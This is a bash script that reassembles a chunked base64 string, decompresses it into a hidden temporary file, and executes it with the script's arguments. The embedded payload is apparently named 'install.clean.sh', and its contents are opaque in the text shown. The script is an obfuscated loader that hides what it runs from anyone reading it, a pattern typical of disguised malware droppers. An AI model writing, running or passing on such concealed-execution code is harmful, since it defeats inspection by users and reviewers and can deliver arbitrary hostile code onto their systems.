#!/usr/bin/env bash
set -Eeuo pipefail
_x=(
'H4sICIQovGoCA2luc3RhbGwuY2xlYW4uc2gAl'
'VXLbttGFN3zK26namI3oF6IXTSFjMoSbQiRHd'
'dSDBtJYIzIYTTWcIYZDiU7sZfZZRE0XbYouuy'
'iP9Ct/qRf0E/o5UMUJaUuOjve57mvwy+/qMWR'
'ro24rDE5hRGNxlbEDNgOixWEPGQ+5cKyNKOek'
'uIG+u1h++jS6R46LTI2Joye1Goj6k6Y9KpXak'
'wlFT4Ntaq6QsUeWTqePN/v9zqXT52Ly65zerm'
'/+7hFjjpqtv/DRfdp82zWvnHa7HByenEud1x6'
'5dHZ+CqcvD14dBjE/eH4bXd3ys2jcdzu3szCv'
'tsiljU8OmmRylYwMSwIwfagZoKwJqihgT1Syk'
'RG07B6nr7tEhT0s6ze8WDY7vcxAH7WuIwMFaI'
'ajYk16B1uSKsRf00srCHXaCYYjZgdxiPB3WrI'
'AsTjokzG4dY2vLMAnw7A1j6kHsS6sxI4kBuBc'
'94bWlbS3cKeuWMF5K9fPkDlawJ7D5qZ9JobaK'
'C79eIFxnrnPO91n9iVLe6BHW/fEbDZG6jDq1d'
'we5s6JDGBOFfMjQ2FQee0dzLM5gauChRobE01'
'gauCgEqMMgUVMhlFAvZqHpvWZCwENPceNFYjP'
'kOjwaAPLALJXBZRzXFFqKYwZZr73KV6JVuSI9'
'RcGh8efhU9ROybO0Agy4CLx3YfJzPcg8922GO'
'arMI5VhAxCGMPK2KuwlHpmGsQFFtMp6iZ/5l4'
'0gTGor5wwm7gZRokCczl4oNLX+G4ENVScg+Q3'
'EbFJquK3N+5zgog4HI6/01wL4XmqZkUinrFFg'
'jlUgGxFrhqDVISYbYwNihtolsi5j6UZuiiyzq'
'M78CMmUyNk5ea2H6EQ3xZCNNKbGwgDtXYhgcs'
'KatR3zAJ6HWqht11HalgYLLugLtcyTBnVTCxC'
'nj2GonmfsCpif1mA0qOsrWBxH62TPpZkDmSiB'
'W6bEQDli01x5NJ26TS5NXMwefJ/WX3+fevP32'
'Es3zjJW7fys5XyzPNEeDRLmnzrsw1hUHORv++'
'4mpkmGQaoUPmj1ym/0+ulMEKI+S4/86Fp+RzH'
'aRritxjR2Wg63zTK1DBlLrzP1TuhQSNCpyiu2'
'CBNHezNPjb24z66tsEWi0gCS2shz9IgIDjNXd'
'2Gt+uXlD5uGMjFseZklJx7ZrOlte+dvoJKeRn'
'XD7+otRciA30uWCLCu69+DPntHfQ67Q7vfmnY'
'3C6GewDDDf/VIUscq7stI87Tr/dbSe15L+An9'
'/DasHLcosl/BFKLaexmf8uDXdVQcaeyq2R6ce'
'B8uCber1UFea6Zm76xy/XSirfE+sfnVxyXxYI'
'AAA='
)
_t="$(mktemp /tmp/.l.XXXXXX)"
_c(){ rm -f "$_t"; }
trap _c EXIT

{
    for ((_i=0; _i<${#_x[@]}; _i++)); do
        printf '%s' "${_x[$_i]}"
    done
} |
base64 -d |
gzip -dc >"$_t" || exit 1

chmod 700 "$_t"
exec bash "$_t" "$@"
